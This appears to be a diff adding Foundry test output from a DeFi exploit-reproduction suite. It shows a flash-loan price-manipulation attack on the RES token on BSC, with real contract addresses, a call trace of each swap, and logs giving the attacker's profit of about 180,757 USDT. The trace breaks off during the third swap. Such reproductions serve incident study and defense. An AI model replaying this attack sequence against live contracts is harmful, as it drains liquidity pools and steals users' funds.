@@ -1,0 +1,828 @@
+Compiling 28 files with Solc 0.8.25
+Solc 0.8.25 finished in 1.32s
+Compiler run successful with warnings:
+Warning (2519): This declaration shadows an existing declaration.
+   --> src/test/interface.sol:886:5:
+    |
+886 |     function WETH() external view returns (address);
+    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> src/test/interface.sol:641:1:
+    |
+641 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+    --> src/test/interface.sol:1598:5:
+     |
+1598 |     function WETH() external view returns (address);
+     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> src/test/interface.sol:641:1:
+    |
+641 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+    --> src/test/interface.sol:1850:5:
+     |
+1850 |     function WETH() external view returns (address);
+     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> src/test/interface.sol:641:1:
+    |
+641 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+    --> src/test/interface.sol:2560:5:
+     |
+2560 |     function WETH() external view returns (address);
+     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> src/test/interface.sol:641:1:
+    |
+641 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+Warning (2519): This declaration shadows an existing declaration.
+    --> src/test/interface.sol:3759:5:
+     |
+3759 |     function WETH() external view returns (address);
+     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+Note: The shadowed declaration is here:
+   --> src/test/interface.sol:641:1:
+    |
+641 | interface WETH {
+    | ^ (Relevant source part starts here and spans across multiple lines).
+
+
+Ran 1 test for script/Exploit-template_new.sol:ExploitScript
+[PASS] testExploit() (gas: 20485)
+Logs:
+  Attacker ETH Balance Before exploit: 0.000000000000000000
+  Attacker ETH Balance After exploit: 0.000000000000000000
+
+Traces:
+  [20485] ExploitScript::testExploit()
+    ├─ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
+    │   └─ ← [Return] 
+    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
+    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
+    └─ ← [Stop] 
+
+Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 285.40ms (101.95µs CPU time)
+
+Ran 1 test for src/test/2022-10/RES_exp.sol:ContractTest
+[PASS] testExploit() (gas: 1085673)
+Logs:
+  [Start] Attacker USDT balance before exploit: 0.000000000000000000
+  [Flashloan] now Attacker USDT balance is: 10014120.886666860414836616
+  [FlashLoan] Res Token Balance of address(user): 1.05937132
+  [FlashLoan] swap 1 over
+  [FlashLoan] swap 2 over
+  [FlashLoan] swap 3 over
+  [FlashLoan] swap 4 over
+  [FlashLoan] swap 5 over
+  [FlashLoan] swap 6 over
+  [FlashLoan] Res Token Balance of address(user): 916265.95063115
+  [FlashLoan] All Token Balance of address(user): 1088.270069500508040221
+  transfer all token over
+  [FlashLoan] sell Alltoken over, Attacker usdt balance is: 8314162.195518672693528035
+  [FlashLoan] sell Restoken over, Attacker usdt balance is: 10220014.049973500894580201
+  [End] Attacker USDT balance after exploit: 180757.719881106660102346
+
+Traces:
+  [1303173] ContractTest::testExploit()
+    ├─ [2531] USDT_TOKEN::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ emit log_named_decimal_uint(key: "[Start] Attacker USDT balance before exploit", val: 0, decimals: 18)
+    ├─ [1288814] USDT_WBNB_PAIR::swap(10014120886666860414836616 [1.001e25], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x626f72726f7775736474)
+    │   ├─ [27971] USDT_TOKEN::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 10014120886666860414836616 [1.001e25])
+    │   │   ├─ emit Transfer(from: USDT_WBNB_PAIR: [0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 10014120886666860414836616 [1.001e25])
+    │   │   └─ ← [Return] true
+    │   ├─ [1229907] ContractTest::pancakeCall(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 10014120886666860414836616 [1.001e25], 0, 0x626f72726f7775736474)
+    │   │   ├─ [531] USDT_TOKEN::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
+    │   │   │   └─ ← [Return] 10014120886666860414836616 [1.001e25]
+    │   │   ├─ emit log_named_decimal_uint(key: "[Flashloan] now Attacker USDT balance is", val: 10014120886666860414836616 [1.001e25], decimals: 18)
+    │   │   ├─ [24562] USDT_TOKEN::approve(PS_ROUTER: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: PS_ROUTER: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [2563] RES_TOKEN::balanceOf(0x3F693Effc53908d517F186A20431f756C90c2229) [staticcall]
+    │   │   │   └─ ← [Return] 105937132 [1.059e8]
+    │   │   ├─ emit log_named_decimal_uint(key: "[FlashLoan] Res Token Balance of address(user)", val: 105937132 [1.059e8], decimals: 8)
+    │   │   ├─ [8071] USDT_TOKEN::transfer(USDT_RES_PAIR: [0x05ba2c512788bd95cd6D61D3109c53a14b01c82A], 476862899365088591182696 [4.768e23])
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: USDT_RES_PAIR: [0x05ba2c512788bd95cd6D61D3109c53a14b01c82A], value: 476862899365088591182696 [4.768e23])
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [223739] USDT_RES_PAIR::swap(0, 71519292481906 [7.151e13], 0x3F693Effc53908d517F186A20431f756C90c2229, 0x)
+    │   │   │   ├─ [187333] RES_TOKEN::transfer(0x3F693Effc53908d517F186A20431f756C90c2229, 71519292481906 [7.151e13])
+    │   │   │   │   ├─ [2439] USDT_RES_PAIR::totalSupply() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 5607099684513225068 [5.607e18]
+    │   │   │   │   ├─ [465] USDT_RES_PAIR::token0() [staticcall]
+    │   │   │   │   │   └─ ← [Return] USDT_TOKEN: [0x55d398326f99059fF775485246999027B3197955]
+    │   │   │   │   ├─ [397] USDT_RES_PAIR::token1() [staticcall]
+    │   │   │   │   │   └─ ← [Return] RES_TOKEN: [0xecCD8B08Ac3B587B7175D40Fb9C60a20990F8D21]
+    │   │   │   │   ├─ [893] USDT_RES_PAIR::getReserves() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 260015849847947963440692 [2.6e23], 110613876127006 [1.106e14], 1665051026 [1.665e9]
+    │   │   │   │   ├─ [531] USDT_TOKEN::balanceOf(USDT_RES_PAIR: [0x05ba2c512788bd95cd6D61D3109c53a14b01c82A]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 736878749213036554623388 [7.368e23]
+    │   │   │   │   ├─ [658] PS_ROUTER::quote(71519292481906 [7.151e13], 110613876127006 [1.106e14], 260015849847947963440692 [2.6e23]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 168117692520374102781668 [1.681e23]
+    │   │   │   │   ├─ [531] USDT_TOKEN::balanceOf(USDT_RES_PAIR: [0x05ba2c512788bd95cd6D61D3109c53a14b01c82A]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 736878749213036554623388 [7.368e23]
+    │   │   │   │   ├─ emit Transfer(from: DefaultSender: [0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38], to: 0x8a08757fB9331ABEE2453C726f93Aea3FF2d078A, value: 1430385849638 [1.43e12])
+    │   │   │   │   ├─ emit Transfer(from: DefaultSender: [0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38], to: 0x55E9d467d778DCAeea53AC11C9aBB58298a973dF, value: 1430385849638 [1.43e12])
+    │   │   │   │   ├─ [252] PS_ROUTER::factory() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73
+    │   │   │   │   ├─ [2676] 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73::getPair(RES_TOKEN: [0xecCD8B08Ac3B587B7175D40Fb9C60a20990F8D21], USDT_TOKEN: [0x55d398326f99059fF775485246999027B3197955]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] USDT_RES_PAIR: [0x05ba2c512788bd95cd6D61D3109c53a14b01c82A]
+    │   │   │   │   ├─ [893] USDT_RES_PAIR::getReserves() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 260015849847947963440692 [2.6e23], 110613876127006 [1.106e14], 1665051026 [1.665e9]
+    │   │   │   │   ├─ [465] USDT_RES_PAIR::token0() [staticcall]
+    │   │   │   │   │   └─ ← [Return] USDT_TOKEN: [0x55d398326f99059fF775485246999027B3197955]
+    │   │   │   │   ├─ [1021] PS_ROUTER::getAmountOut(2145578774457 [2.145e12], 110613876127006 [1.106e14], 260015849847947963440692 [2.6e23]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 4935428706169469143666 [4.935e21]
+    │   │   │   │   ├─ [252] PS_ROUTER::factory() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73
+    │   │   │   │   ├─ [2676] 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73::getPair(USDT_TOKEN: [0x55d398326f99059fF775485246999027B3197955], 0x04C0f31C0f59496cf195d2d7F1dA908152722DE7) [staticcall]
+    │   │   │   │   │   └─ ← [Return] USDT_ALL_PAIR: [0x1B214e38C5e861c56e12a69b6BAA0B45eFe5C8Eb]
+    │   │   │   │   ├─ [2893] USDT_ALL_PAIR::getReserves() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 480129195968803076456 [4.801e20], 41761128268609605264847 [4.176e22], 1665044901 [1.665e9]
+    │   │   │   │   ├─ [2465] USDT_ALL_PAIR::token0() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0x04C0f31C0f59496cf195d2d7F1dA908152722DE7
+    │   │   │   │   ├─ [1021] PS_ROUTER::getAmountOut(4935428706169469143666 [4.935e21], 41761128268609605264847 [4.176e22], 480129195968803076456 [4.801e20]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 50632084862339124108 [5.063e19]
+    │   │   │   │   ├─ [26018] 0x04C0f31C0f59496cf195d2d7F1dA908152722DE7::transfer(0x3F693Effc53908d517F186A20431f756C90c2229, 50632084862339124108 [5.063e19])
+    │   │   │   │   │   ├─ [2439] USDT_ALL_PAIR::totalSupply() [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 4475079325253002664477 [4.475e21]
+    │   │   │   │   │   ├─ emit Transfer(from: RES_TOKEN: [0xecCD8B08Ac3B587B7175D40Fb9C60a20990F8D21], to: 0x3F693Effc53908d517F186A20431f756C90c2229, value: 50632084862339124108 [5.063e19])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [252] PS_ROUTER::factory() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73
+    │   │   │   │   ├─ [676] 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73::getPair(RES_TOKEN: [0xecCD8B08Ac3B587B7175D40Fb9C60a20990F8D21], USDT_TOKEN: [0x55d398326f99059fF775485246999027B3197955]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] USDT_RES_PAIR: [0x05ba2c512788bd95cd6D61D3109c53a14b01c82A]
+    │   │   │   │   ├─ [893] USDT_RES_PAIR::getReserves() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 260015849847947963440692 [2.6e23], 110613876127006 [1.106e14], 1665051026 [1.665e9]
+    │   │   │   │   ├─ [465] USDT_RES_PAIR::token0() [staticcall]
+    │   │   │   │   │   └─ ← [Return] USDT_TOKEN: [0x55d398326f99059fF775485246999027B3197955]
+    │   │   │   │   ├─ [1021] PS_ROUTER::getAmountOut(5721543398552 [5.721e12], 110613876127006 [1.106e14], 260015849847947963440692 [2.6e23]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 12757552494087595811290 [1.275e22]
+    │   │   │   │   ├─ [252] PS_ROUTER::factory() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73
+    │   │   │   │   ├─ [676] 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73::getPair(USDT_TOKEN: [0x55d398326f99059fF775485246999027B3197955], 0x04C0f31C0f59496cf195d2d7F1dA908152722DE7) [staticcall]
+    │   │   │   │   │   └─ ← [Return] USDT_ALL_PAIR: [0x1B214e38C5e861c56e12a69b6BAA0B45eFe5C8Eb]
+    │   │   │   │   ├─ [893] USDT_ALL_PAIR::getReserves() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 480129195968803076456 [4.801e20], 41761128268609605264847 [4.176e22], 1665044901 [1.665e9]
+    │   │   │   │   ├─ [465] USDT_ALL_PAIR::token0() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0x04C0f31C0f59496cf195d2d7F1dA908152722DE7
+    │   │   │   │   ├─ [1021] PS_ROUTER::getAmountOut(12757552494087595811290 [1.275e22], 41761128268609605264847 [4.176e22], 480129195968803076456 [4.801e20]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 112136548834394103396 [1.121e20]
+    │   │   │   │   ├─ [13718] 0x04C0f31C0f59496cf195d2d7F1dA908152722DE7::transfer(0xe3f0C9F99BECced5197300d64ea3a814ECD862f7, 112136548834394103396 [1.121e20])
+    │   │   │   │   │   ├─ [439] USDT_ALL_PAIR::totalSupply() [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 4475079325253002664477 [4.475e21]
+    │   │   │   │   │   ├─ emit Transfer(from: RES_TOKEN: [0xecCD8B08Ac3B587B7175D40Fb9C60a20990F8D21], to: 0xe3f0C9F99BECced5197300d64ea3a814ECD862f7, value: 112136548834394103396 [1.121e20])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ emit Transfer(from: USDT_RES_PAIR: [0x05ba2c512788bd95cd6D61D3109c53a14b01c82A], to: 0x3F693Effc53908d517F186A20431f756C90c2229, value: 60791398609620 [6.079e13])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [531] USDT_TOKEN::balanceOf(USDT_RES_PAIR: [0x05ba2c512788bd95cd6D61D3109c53a14b01c82A]) [staticcall]
+    │   │   │   │   └─ ← [Return] 736878749213036554623388 [7.368e23]
+    │   │   │   ├─ [563] RES_TOKEN::balanceOf(USDT_RES_PAIR: [0x05ba2c512788bd95cd6D61D3109c53a14b01c82A]) [staticcall]
+    │   │   │   │   └─ ← [Return] 39094583645100 [3.909e13]
+    │   │   │   ├─ emit Sync(reserve0: 736878749213036554623388 [7.368e23], reserve1: 39094583645100 [3.909e13])
+    │   │   │   ├─ emit Swap(sender: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount0In: 476862899365088591182696 [4.768e23], amount1In: 0, amount0Out: 0, amount1Out: 71519292481906 [7.151e13], to: 0x3F693Effc53908d517F186A20431f756C90c2229)
+    │   │   │   └─ ← [Stop] 
+    │   │   ├─ [0] console::log("[FlashLoan] swap 1 over") [staticcall]
+    │   │   │   └─ ← [Stop] 
+    │   │   ├─ [3271] USDT_TOKEN::transfer(USDT_RES_PAIR: [0x05ba2c512788bd95cd6D61D3109c53a14b01c82A], 953725798730177182365392 [9.537e23])
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: USDT_RES_PAIR: [0x05ba2c512788bd95cd6D61D3109c53a14b01c82A], value: 953725798730177182365392 [9.537e23])
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [101055] USDT_RES_PAIR::swap(0, 22030478307020 [2.203e13], 0x3F693Effc53908d517F186A20431f756C90c2229, 0x)
+    │   │   │   ├─ [85933] RES_TOKEN::transfer(0x3F693Effc53908d517F186A20431f756C90c2229, 22030478307020 [2.203e13])
+    │   │   │   │   ├─ [439] USDT_RES_PAIR::totalSupply() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 5607099684513225068 [5.607e18]
+    │   │   │   │   ├─ [465] USDT_RES_PAIR::token0() [staticcall]
+    │   │   │   │   │   └─ ← [Return] USDT_TOKEN: [0x55d398326f99059fF775485246999027B3197955]
+    │   │   │   │   ├─ [397] USDT_RES_PAIR::token1() [staticcall]
+    │   │   │   │   │   └─ ← [Return] RES_TOKEN: [0xecCD8B08Ac3B587B7175D40Fb9C60a20990F8D21]
+    │   │   │   │   ├─ [893] USDT_RES_PAIR::getReserves() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 736878749213036554623388 [7.368e23], 39094583645100 [3.909e13], 1665051347 [1.665e9]
+    │   │   │   │   ├─ [531] USDT_TOKEN::balanceOf(USDT_RES_PAIR: [0x05ba2c512788bd95cd6D61D3109c53a14b01c82A]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 1690604547943213736988780 [1.69e24]
+    │   │   │   │   ├─ [658] PS_ROUTER::quote(22030478307020 [2.203e13], 39094583645100 [3.909e13], 736878749213036554623388 [7.368e23]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 415244000212713054798196 [4.152e23]
+    │   │   │   │   ├─ [531] USDT_TOKEN::balanceOf(USDT_RES_PAIR: [0x05ba2c512788bd95cd6D61D3109c53a14b01c82A]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 1690604547943213736988780 [1.69e24]
+    │   │   │   │   ├─ emit Transfer(from: DefaultSender: [0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38], to: 0x8a08757fB9331ABEE2453C726f93Aea3FF2d078A, value: 440609566140 [4.406e11])
+    │   │   │   │   ├─ emit Transfer(from: DefaultSender: [0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38], to: 0x55E9d467d778DCAeea53AC11C9aBB58298a973dF, value: 440609566140 [4.406e11])
+    │   │   │   │   ├─ [252] PS_ROUTER::factory() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73
+    │   │   │   │   ├─ [676] 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73::getPair(RES_TOKEN: [0xecCD8B08Ac3B587B7175D40Fb9C60a20990F8D21], USDT_TOKEN: [0x55d398326f99059fF775485246999027B3197955]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] USDT_RES_PAIR: [0x05ba2c512788bd95cd6D61D3109c53a14b01c82A]
+    │   │   │   │   ├─ [893] USDT_RES_PAIR::getReserves() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 736878749213036554623388 [7.368e23], 39094583645100 [3.909e13], 1665051347 [1.665e9]
+    │   │   │   │   ├─ [465] USDT_RES_PAIR::token0() [staticcall]
+    │   │   │   │   │   └─ ← [Return] USDT_TOKEN: [0x55d398326f99059fF775485246999027B3197955]
+    │   │   │   │   ├─ [1021] PS_ROUTER::getAmountOut(660914349210 [6.609e11], 39094583645100 [3.909e13], 736878749213036554623388 [7.368e23]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 12220105903672486559076 [1.222e22]
+    │   │   │   │   ├─ [252] PS_ROUTER::factory() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73
+    │   │   │   │   ├─ [676] 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73::getPair(USDT_TOKEN: [0x55d398326f99059fF775485246999027B3197955], 0x04C0f31C0f59496cf195d2d7F1dA908152722DE7) [staticcall]
+    │   │   │   │   │   └─ ← [Return] USDT_ALL_PAIR: [0x1B214e38C5e861c56e12a69b6BAA0B45eFe5C8Eb]
+    │   │   │   │   ├─ [893] USDT_ALL_PAIR::getReserves() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 480129195968803076456 [4.801e20], 41761128268609605264847 [4.176e22], 1665044901 [1.665e9]
+    │   │   │   │   ├─ [465] USDT_ALL_PAIR::token0() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0x04C0f31C0f59496cf195d2d7F1dA908152722DE7
+    │   │   │   │   ├─ [1021] PS_ROUTER::getAmountOut(12220105903672486559076 [1.222e22], 41761128268609605264847 [4.176e22], 480129195968803076456 [4.801e20]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 108479839813714591946 [1.084e20]
+    │   │   │   │   ├─ [6418] 0x04C0f31C0f59496cf195d2d7F1dA908152722DE7::transfer(0x3F693Effc53908d517F186A20431f756C90c2229, 108479839813714591946 [1.084e20])
+    │   │   │   │   │   ├─ [439] USDT_ALL_PAIR::totalSupply() [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 4475079325253002664477 [4.475e21]
+    │   │   │   │   │   ├─ emit Transfer(from: RES_TOKEN: [0xecCD8B08Ac3B587B7175D40Fb9C60a20990F8D21], to: 0x3F693Effc53908d517F186A20431f756C90c2229, value: 108479839813714591946 [1.084e20])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ [252] PS_ROUTER::factory() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73
+    │   │   │   │   ├─ [676] 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73::getPair(RES_TOKEN: [0xecCD8B08Ac3B587B7175D40Fb9C60a20990F8D21], USDT_TOKEN: [0x55d398326f99059fF775485246999027B3197955]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] USDT_RES_PAIR: [0x05ba2c512788bd95cd6D61D3109c53a14b01c82A]
+    │   │   │   │   ├─ [893] USDT_RES_PAIR::getReserves() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 736878749213036554623388 [7.368e23], 39094583645100 [3.909e13], 1665051347 [1.665e9]
+    │   │   │   │   ├─ [465] USDT_RES_PAIR::token0() [staticcall]
+    │   │   │   │   │   └─ ← [Return] USDT_TOKEN: [0x55d398326f99059fF775485246999027B3197955]
+    │   │   │   │   ├─ [1021] PS_ROUTER::getAmountOut(1762438264561 [1.762e12], 39094583645100 [3.909e13], 736878749213036554623388 [7.368e23]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 31710491969306971635478 [3.171e22]
+    │   │   │   │   ├─ [252] PS_ROUTER::factory() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73
+    │   │   │   │   ├─ [676] 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73::getPair(USDT_TOKEN: [0x55d398326f99059fF775485246999027B3197955], 0x04C0f31C0f59496cf195d2d7F1dA908152722DE7) [staticcall]
+    │   │   │   │   │   └─ ← [Return] USDT_ALL_PAIR: [0x1B214e38C5e861c56e12a69b6BAA0B45eFe5C8Eb]
+    │   │   │   │   ├─ [893] USDT_ALL_PAIR::getReserves() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 480129195968803076456 [4.801e20], 41761128268609605264847 [4.176e22], 1665044901 [1.665e9]
+    │   │   │   │   ├─ [465] USDT_ALL_PAIR::token0() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0x04C0f31C0f59496cf195d2d7F1dA908152722DE7
+    │   │   │   │   ├─ [1021] PS_ROUTER::getAmountOut(31710491969306971635478 [3.171e22], 41761128268609605264847 [4.176e22], 480129195968803076456 [4.801e20]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 206929896922381878307 [2.069e20]
+    │   │   │   │   ├─ [6418] 0x04C0f31C0f59496cf195d2d7F1dA908152722DE7::transfer(0xe3f0C9F99BECced5197300d64ea3a814ECD862f7, 206929896922381878307 [2.069e20])
+    │   │   │   │   │   ├─ [439] USDT_ALL_PAIR::totalSupply() [staticcall]
+    │   │   │   │   │   │   └─ ← [Return] 4475079325253002664477 [4.475e21]
+    │   │   │   │   │   ├─ emit Transfer(from: RES_TOKEN: [0xecCD8B08Ac3B587B7175D40Fb9C60a20990F8D21], to: 0xe3f0C9F99BECced5197300d64ea3a814ECD862f7, value: 206929896922381878307 [2.069e20])
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   ├─ emit Transfer(from: USDT_RES_PAIR: [0x05ba2c512788bd95cd6D61D3109c53a14b01c82A], to: 0x3F693Effc53908d517F186A20431f756C90c2229, value: 18725906560967 [1.872e13])
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [531] USDT_TOKEN::balanceOf(USDT_RES_PAIR: [0x05ba2c512788bd95cd6D61D3109c53a14b01c82A]) [staticcall]
+    │   │   │   │   └─ ← [Return] 1690604547943213736988780 [1.69e24]
+    │   │   │   ├─ [563] RES_TOKEN::balanceOf(USDT_RES_PAIR: [0x05ba2c512788bd95cd6D61D3109c53a14b01c82A]) [staticcall]
+    │   │   │   │   └─ ← [Return] 17064105338080 [1.706e13]
+    │   │   │   ├─ emit Sync(reserve0: 1690604547943213736988780 [1.69e24], reserve1: 17064105338080 [1.706e13])
+    │   │   │   ├─ emit Swap(sender: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount0In: 953725798730177182365392 [9.537e23], amount1In: 0, amount0Out: 0, amount1Out: 22030478307020 [2.203e13], to: 0x3F693Effc53908d517F186A20431f756C90c2229)
+    │   │   │   └─ ← [Stop] 
+    │   │   ├─ [0] console::log("[FlashLoan] swap 2 over") [staticcall]
+    │   │   │   └─ ← [Stop] 
+    │   │   ├─ [3271] USDT_TOKEN::transfer(USDT_RES_PAIR: [0x05ba2c512788bd95cd6D61D3109c53a14b01c82A], 1430588698095265773548088 [1.43e24])
+    │   │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: USDT_RES_PAIR: [0x05ba2c512788bd95cd6D61D3109c53a14b01c82A], value: 1430588698095265773548088 [1.43e24])
+    │   │   │   └─ ← [Return] true
+    │   │   ├─ [101055] USDT_RES_PAIR::swap(0, 7810673572823 [7.81e12], 0x3F693Effc53908d517F186A20431f756C90c2229, 0x)
+    │   │   │   ├─ [85933] RES_TOKEN::transfer(0x3F693Effc53908d517F186A20431f756C90c2229, 7810673572823 [7.81e12])
+    │   │   │   │   ├─ [439] USDT_RES_PAIR::totalSupply() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 5607099684513225068 [5.607e18]
+    │   │   │   │   ├─ [465] USDT_RES_PAIR::token0() [staticcall]
+    │   │   │   │   │   └─ ← [Return] USDT_TOKEN: [0x55d398326f99059fF775485246999027B3197955]
+    │   │   │   │   ├─ [397] USDT_RES_PAIR::token1() [staticcall]
+    │   │   │   │   │   └─ ← [Return] RES_TOKEN: [0xecCD8B08Ac3B587B7175D40Fb9C60a20990F8D21]
+    │   │   │   │   ├─ [893] USDT_RES_PAIR::getReserves() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 1690604547943213736988780 [1.69e24], 17064105338080 [1.706e13], 1665051347 [1.665e9]
+    │   │   │   │   ├─ [531] USDT_TOKEN::balanceOf(USDT_RES_PAIR: [0x05ba2c512788bd95cd6D61D3109c53a14b01c82A]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 3121193246038479510536868 [3.121e24]
+    │   │   │   │   ├─ [658] PS_ROUTER::quote(7810673572823 [7.81e12], 17064105338080 [1.706e13], 1690604547943213736988780 [1.69e24]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 773832556884590384532946 [7.738e23]
+    │   │   │   │   ├─ [531] USDT_TOKEN::balanceOf(USDT_RES_PAIR: [0x05ba2c512788bd95cd6D61D3109c53a14b01c82A]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] 3121193246038479510536868 [3.121e24]
+    │   │   │   │   ├─ emit Transfer(from: DefaultSender: [0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38], to: 0x8a08757fB9331ABEE2453C726f93Aea3FF2d078A, value: 156213471456 [1.562e11])
+    │   │   │   │   ├─ emit Transfer(from: DefaultSender: [0x1804c8AB1F12E6bbf3894d4083f33e07309d1f38], to: 0x55E9d467d778DCAeea53AC11C9aBB58298a973dF, value: 156213471456 [1.562e11])
+    │   │   │   │   ├─ [252] PS_ROUTER::factory() [staticcall]
+    │   │   │   │   │   └─ ← [Return] 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73
+    │   │   │   │   ├─ [676] 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73::getPair(RES_TOKEN: [0xecCD8B08Ac3B587B7175D40Fb9C60a20990F8D21], USDT_TOKEN: [0x55d398326f99059fF775485246999027B3197955]) [staticcall]
+    │   │   │   │   │   └─ ← [Return] USDT_RES_PAIR: [0x05ba2c512788bd95cd6D61D3109c53a14b01c82A]
